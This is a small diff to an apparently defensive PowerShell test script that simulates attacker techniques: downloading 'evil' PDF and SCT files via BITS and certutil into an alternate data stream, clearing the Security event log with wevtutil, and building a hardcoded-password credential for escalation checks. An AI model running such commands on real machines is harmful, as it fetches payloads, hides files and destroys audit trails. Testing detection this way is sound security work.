@@ -48,7 +48,7 @@ Start-BitsTransfer -Source ($TPPSecurityTestSite + $EvilPDF) -Destination ($Fold
 "certutil.exe -urlcache -split -f " + ($TPPSecurityTestSite + $EvilSCT) + " fileattributes.txt:test" | cmd
 
 #Check for event log clearance
-"wevtutil clear-log security" | cmd
+"wevtutil clear-log Security" | cmd
 
 #Check for escalation
 $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String TppTestPasswordS3cur!ty
